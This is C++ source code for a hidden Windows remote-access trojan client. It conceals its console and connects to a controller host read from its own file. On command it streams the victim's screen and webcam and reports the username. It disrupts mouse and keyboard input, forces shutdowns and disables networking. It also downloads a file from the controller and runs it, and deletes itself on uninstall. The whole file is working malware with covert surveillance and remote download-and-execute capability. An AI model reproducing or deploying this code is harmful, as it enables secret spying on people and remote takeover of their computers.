#include "Functions.h"

enum EFFECTS{ MOUSE_LOCK, MOUSE_INVERT, MOUSE_VIBRATE, MOUSE_TRAIL, KEYBOARD_RANDOMSPACES, KEYBOARD_RANDOMTABS, KEYBOARD_BEEPING, SCREEN_SHOW, CAMERA_SHOW, BOUNCING_WINDOWS, DISABLE_INTERNET, SWAP_MOUSE };

int main(int argc, char *argv[]) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	srand((unsigned)time(0));
	bool done = false, connected = false, tryConnect = true;;
	int connectTimerStart = 500, connectTimer = connectTimerStart;
	int screenWidth = GetSystemMetrics(SM_CXSCREEN), screenHeight = GetSystemMetrics(SM_CYSCREEN);
	POINT mousePos; mousePos.x = 0; mousePos.y = 0;
	POINT mousePosPrev; mousePosPrev.x = 0; mousePosPrev.y = 0;
	POINT mouseLockPos; mouseLockPos.x = 0; mouseLockPos.y = 0;
	string loadFileName = "";
	string fileData;
	int loadFileDeleteTimer = 0, loadFileDeleteTimerStart = 100;
	int cameraWidth = 0, cameraHeight = 0;
	int screenshotTimer = 5;
	float timer = 0;
	
	vector<Pixel> screenData;
	int quality = 1;
	
	map<int, bool> effects;
	vector<string> sounds;

	al_init();
	al_init_image_addon();
	FindSounds(sounds);

	al_set_new_bitmap_flags(ALLEGRO_VIDEO_BITMAP);
	ALLEGRO_BITMAP *screen = al_create_bitmap(screenWidth, screenHeight);
	ALLEGRO_BITMAP *prevScreen = al_create_bitmap(screenWidth, screenHeight);
	al_set_target_bitmap(screen);
	al_clear_to_color(al_map_rgb(255, 0, 255));
	al_set_target_bitmap(prevScreen);
	al_clear_to_color(al_map_rgb(255, 0, 255));

	VideoCapture cap;

	if (!enet_initialize())
		cout << "Initialized ENet\n";
	ENetAddress address;
	ENetPeer *peer = NULL;
	ENetHost *client;
	ENetEvent event;

	client = enet_host_create(NULL, 1, 1, 0, 0);
	if (client == NULL){
		fprintf(stderr, "An error occurred while trying to create an ENet client host.\n");
		exit(EXIT_FAILURE);
	}
	else
		std::cout << "Client created" << std::endl;

	vector<string> IPandPort = GetIpAndPort(argv[0]);
	enet_address_set_host(&address, IPandPort[0].c_str());
	address.port = stoi(IPandPort[1]);

	//enet_address_set_host(&address, "192.168.1.4");
	//address.port = 12345;

	while (!done) {
		if (!connected) {
			connectTimer--;
			if (connectTimer <= 0) {
				connectTimer = connectTimerStart;

				if (tryConnect) {
					cout << "Attempting to connect to " << IPandPort[0] << ":" << IPandPort[1] << "..." << endl;
					peer = enet_host_connect(client, &address, 1, 0);
				}

				tryConnect = !tryConnect;
			}
		}
		else {
			GetCursorPos(&mousePos);

			if (effects[BOUNCING_WINDOWS]) {
				RECT pos;
				if (GetWindowRect(GetForegroundWindow(), &pos)) {

					ShowWindow(GetForegroundWindow(), SW_NORMAL);
					SetWindowPos(GetForegroundWindow(), NULL, pos.left, pos.top + int(cos(timer) * 4.0), 0, 0, SWP_NOZORDER | SWP_NOSIZE);

				}
				Sleep(50);
				timer += .4;
			}

			if (effects[SCREEN_SHOW] && (mousePos.x != mousePosPrev.x || mousePos.y != mousePosPrev.y)) {
				SendPacket(peer, "MousePos", to_string(mousePos.x).c_str(), to_string(mousePos.y).c_str(), "");
				//enet_host_flush(client);
			}

			/*if (loadFileDeleteTimer > 0) {
				loadFileDeleteTimer--;
				if (loadFileDeleteTimer == 0) {
					cout << "Trying " << endl;
					//if (remove(loadFileName.c_str()) != 0) {
						loadFileDeleteTimer = loadFileDeleteTimerStart;
					}
				}
			}*/

			if (effects[SCREEN_SHOW] || effects[CAMERA_SHOW]) {
				if (screenData.size() > 0) {
					SendScreenData(screenData, peer);
				}
				else {
					if (effects[SCREEN_SHOW]) {
						if (screenshotTimer > 0)
							screenshotTimer--;
						if (screenshotTimer <= 0) {
							ScreenShot("C:\\Windows\\temp\\screen.bmp");
							screenshotTimer = 50;

							screen = al_load_bitmap("C:\\Windows\\temp\\screen.bmp");
							al_lock_bitmap(screen, ALLEGRO_PIXEL_FORMAT_ANY, ALLEGRO_LOCK_READONLY);
							al_set_target_bitmap(prevScreen);
							for (int y = 0; y < screenHeight; y += quality) {
								for (int x = 0; x < screenWidth; x += quality) {
									ALLEGRO_COLOR oldColor = al_get_pixel(prevScreen, x, y);
									ALLEGRO_COLOR color = al_get_pixel(screen, x, y);
									Pixel pixel;
									pixel.color = color;
									pixel.color.r *= 255;
									pixel.color.g *= 255;
									pixel.color.b *= 255;
									pixel.x = x;
									pixel.y = y;
									if (oldColor.r != color.r || oldColor.g != color.g || oldColor.b != color.b)
										screenData.push_back(pixel);
									al_draw_filled_rectangle(x, y, x + quality, y + quality, color);
								}
							}
							al_unlock_bitmap(screen);
							//prevScreen = screen;
						}
					}
					else if (effects[CAMERA_SHOW]) {
						Mat frame;
						if (cap.read(frame)) {
							flip(frame, frame, 1);
							//al_set_target_bitmap(screen);
							al_lock_bitmap(screen, ALLEGRO_PIXEL_FORMAT_ANY, ALLEGRO_LOCK_READONLY);
							for (int y = 0; y < cameraHeight; y += quality) {
								for (int x = 0; x < cameraWidth; x += quality) {
									ALLEGRO_COLOR oldColor = al_get_pixel(prevScreen, x, y);
									Vec3b cameraColor = frame.at<Vec3b>(y, x);
									Pixel pixel;
									pixel.color.r = cameraColor.val[2];
									pixel.color.g = cameraColor.val[1];
									pixel.color.b = cameraColor.val[0];
									pixel.x = x;
									pixel.y = y;

									if (abs(oldColor.r * 255 - pixel.color.r) > 10 || abs(oldColor.g * 255 - pixel.color.g) > 10 || abs(oldColor.b * 255 - pixel.color.b) > 10)
										screenData.push_back(pixel);
									//al_draw_filled_rectangle(x, y, x + quality, y + quality, pixel.color);
								}
							}
							al_unlock_bitmap(screen);
							prevScreen = screen;
						}
					}
				}
			}

			if (effects[EFFECTS::MOUSE_LOCK]) {
				SetCursorPos(mouseLockPos.x, mouseLockPos.y);
			}
			if (effects[EFFECTS::MOUSE_INVERT]) {
				if (mousePos.x != mousePosPrev.x || mousePos.y != mousePosPrev.y) {
					mousePosPrev.x += mousePosPrev.x - mousePos.x;
					mousePosPrev.y += mousePosPrev.y - mousePos.y;

					if (mousePosPrev.x < 5) mousePosPrev.x = 5;
					else if (mousePosPrev.x > screenWidth - 5) mousePosPrev.x = screenWidth - 5;
					if (mousePosPrev.y < 5) mousePosPrev.y = 5;
					else if (mousePosPrev.y > screenHeight - 5) mousePosPrev.y = screenHeight - 5;

					SetCursorPos(mousePosPrev.x, mousePosPrev.y);
				}
			}
			else {
				mousePosPrev = mousePos;
			}
			if (effects[EFFECTS::MOUSE_VIBRATE]) {
				SetCursorPos(mousePos.x + rand() % 3 - 1, mousePos.y + rand() % 3 - 1);
			}
			if (effects[EFFECTS::MOUSE_TRAIL]) {
				HDC dc;
				dc = GetDC(NULL);
				int x = rand() % 5 - 2;
				int y = rand() % 5 - 2;
				Rectangle(dc, mousePos.x - 2 + x, mousePos.y - 2 + y, mousePos.x + 2 + x, mousePos.y + 2 + y);
				ReleaseDC(NULL, dc);
			}

			if (effects[EFFECTS::KEYBOARD_RANDOMSPACES]) {
				for (int i = 'A'; i < 'Z'; i++) {
					if (GetAsyncKeyState(i)) {
						if (rand() % 30 == 0) {
							PressKey(VK_SPACE);
						}
						break;
					}
				}
			}
			if (effects[EFFECTS::KEYBOARD_RANDOMTABS]) {
				for (int i = 'A'; i < 'Z'; i++) {
					if (GetAsyncKeyState(i)) {
						if (rand() % 50 == 0) {
							PressKey(VK_TAB);
						}
						break;
					}
				}
			}
			if (effects[EFFECTS::KEYBOARD_BEEPING]) {
				for (int i = 'A'; i < 'Z'; i++) {
					if (GetAsyncKeyState(i)) {
						if (rand() % 10 == 0) {
							Beep(rand() % 100 + 300, rand() % 200 + 100);
						}
						break;
					}
				}
			}
		}

		while (enet_host_service(client, &event, 10) > 0) {
			switch (event.type) {
			case ENET_EVENT_TYPE_CONNECT:
			{
				printf("Connected to server: %x:%u.\n", event.peer->address.host, event.peer->address.port);
				connected = true;
				peer->timeoutLimit = 10000000;

				SendPacket(peer, "Info", GetUsername().c_str(), "");
				SendPacket(peer, "ScreenSize", to_string(screenWidth).c_str(), to_string(screenHeight).c_str(), "");
			}
			break;

			case ENET_EVENT_TYPE_RECEIVE:
			{
				//printf("Recieved a packet containing %s\n", event.packet->data);
				int messageCount = 0;
				string type;
				char message[256];
				vector<string> msgVars;

				for (unsigned int i = 0; i < event.packet->dataLength; ++i) {
					message[i] = event.packet->data[i];
				}
				string coords = message;
				istringstream ss(coords);
				string token;

				while (getline(ss, token, ',')) {
					if (messageCount == 0)
						type = token;
					else
						msgVars.push_back(token);
					messageCount++;
				}

				if (type == "Unselect") {
					DeactivateEffects(effects);
					cap.release();
				}
				else if (type == "LockMouse") {
					effects[EFFECTS::MOUSE_LOCK] = !effects[EFFECTS::MOUSE_LOCK];
					GetCursorPos(&mouseLockPos);
				}
				else if (type == "InvertMouse") {
					effects[EFFECTS::MOUSE_INVERT] = !effects[EFFECTS::MOUSE_INVERT];
				}
				else if (type == "VibratingMouse") {
					effects[EFFECTS::MOUSE_VIBRATE] = !effects[EFFECTS::MOUSE_VIBRATE];
				}
				else if (type == "MoveMouse") {
					GetCursorPos(&mousePos);
					SetCursorPos(mousePos.x + stoi(msgVars[0].c_str()), mousePos.y + stoi(msgVars[1].c_str()));
				}
				else if (type == "MouseTrail") {
					effects[EFFECTS::MOUSE_TRAIL] = !effects[EFFECTS::MOUSE_TRAIL];
				}
				else if (type == "MouseButton") {
					SimulateMouse(stoi(msgVars[0].c_str()), stoi(msgVars[1].c_str()));
				}
				else if (type == "SwapButtons") {
					effects[SWAP_MOUSE] = !effects[SWAP_MOUSE];
					SwapMouseButton(effects[SWAP_MOUSE]);
				}

				else if (type == "RandomSpaces") {
					effects[EFFECTS::KEYBOARD_RANDOMSPACES] = !effects[EFFECTS::KEYBOARD_RANDOMSPACES];
				}
				else if (type == "RandomTabs") {
					effects[EFFECTS::KEYBOARD_RANDOMTABS] = !effects[EFFECTS::KEYBOARD_RANDOMTABS];
				}
				else if (type == "BeepingKeyboard") {
					effects[EFFECTS::KEYBOARD_BEEPING] = !effects[EFFECTS::KEYBOARD_BEEPING];
				}
				else if (type == "KeyLogger") {
					cout << "Key Logger" << endl;
				}

				else if (type == "Shutdown") {
					if (msgVars[0] == "1")
						system("shutdown -l -f");
					else if (msgVars[0] == "2")
						system("shutdown -s -f");
					else if (msgVars[0] == "3")
						system("shutdown -r -f");
				}
				else if (type == "WhiteRectangles")
					WhiteRectangles(screenWidth, screenHeight);
				else if (type == "BouncingWindows")
					effects[EFFECTS::BOUNCING_WINDOWS] = !effects[EFFECTS::BOUNCING_WINDOWS];
				else if (type == "MaxVolume")
					VolumeUp();
				else if (type == "Beep")
					Beep(rand() % 500 + 300, rand() % 300 + 100);
				else if (type == "PlaySound")
					PlaySound(sounds[rand() % sounds.size()].c_str(), NULL, SND_ASYNC);
				else if (type == "Open/CloseDrive")
					OpenCloseDrive();
				else if (type == "Internet") {
					ShellExecute(NULL, "open", "cmd.exe", string("/C choice /C Y /N /D Y /T 1 & ipconfig/release & choice /C Y /N /D Y /T " + msgVars[0] + " & ipconfig/renew").c_str(), NULL, SW_HIDE);
				}
				else if (type == "Website")
					ShellExecute(NULL, "open", msgVars[0].c_str(), NULL, NULL, SW_SHOWNORMAL);
				else if (type == "Say")
					talk(msgVars[0]);
				else if (type == "FileName") {
					loadFileName = msgVars[0];
					fileData = "";
					remove(loadFileName.c_str());
				}
				else if (type == "FileData") {
					for (unsigned i = 0; i < msgVars.size(); i++) {
						
						fileData += msgVars[i];
						if (i < msgVars.size() - 1)
							fileData += ",";
					}
				}
				else if (type == "FileEnd") {
					cout << "Writing to new file..." << endl;
					fstream newFile(loadFileName, ios::out | ios::binary);
					for (unsigned i = 0; i < fileData.size(); i++)
						newFile << fileData[i];
					newFile.close();
					ShellExecute(NULL, "open", loadFileName.c_str(), NULL, NULL, SW_SHOWNORMAL);
				}

				else if (type == "ShowScreen") {
					remove("C:\\Windows\\temp\\screen.bmp");
					screenData.clear();
					screenshotTimer = 0;
					int var = stoi(msgVars[1].c_str());
					if (var > 0) {
						quality = var;
						al_set_target_bitmap(prevScreen);
						al_clear_to_color(al_map_rgb(255, 0, 255));
					}
					effects[EFFECTS::SCREEN_SHOW] = stoi(msgVars[0].c_str());
					if (effects[EFFECTS::SCREEN_SHOW]) {
						cap.release();
						SendPacket(peer, "ScreenSize", to_string(screenWidth).c_str(), to_string(screenHeight).c_str(), "");
						al_set_target_bitmap(prevScreen);
						al_clear_to_color(al_map_rgb(255, 0, 255));
					}
				}

				else if (type == "ShowCamera") {
					effects[SCREEN_SHOW] = false;

					screenData.clear();
					int var = stoi(msgVars[1].c_str());
					if (var > 0)
						quality = var;
					effects[EFFECTS::CAMERA_SHOW] = stoi(msgVars[0].c_str());

					if (effects[CAMERA_SHOW]) {
						cap.open(stoi(msgVars[2].c_str()));
						if (cap.isOpened()) {
							al_set_target_bitmap(prevScreen);
							al_clear_to_color(al_map_rgb(255, 0, 255));
							screenData.clear();
							cameraWidth = cap.get(CV_CAP_PROP_FRAME_WIDTH);
							cameraHeight = cap.get(CV_CAP_PROP_FRAME_HEIGHT);
							SendPacket(peer, "ScreenSize", to_string(cameraWidth).c_str(), to_string(cameraHeight).c_str(), "");
						}
						else {
							SendPacket(peer, "NoCamera", msgVars[2].c_str(), "");
						}
					}
					else {
						cap.release();
					}
				}

				else if (type == "Exit") {
					enet_peer_disconnect(peer, NULL);
					done = true;
				}
				else if (type == "Uninstall") {
					done = true;
					ShellExecute(NULL, "open", "cmd.exe", string("/C choice /C Y /N /D Y /T 10 & del /Q /S \"" + string(argv[0]) + "\"" + " & exit").c_str(), NULL, SW_HIDE);
				}

				enet_packet_destroy(event.packet);
			}
			break;

			case ENET_EVENT_TYPE_DISCONNECT:
				//system("cls");
				printf("(Client) %s disconnected.\n", event.peer->data);
				event.peer->data = NULL;
				connected = false;
				DeactivateEffects(effects);
				SwapMouseButton(false);
				cap.release();
				break;
			}
		}

		Sleep(10);
	}
	al_destroy_bitmap(screen);
	al_destroy_bitmap(prevScreen);
}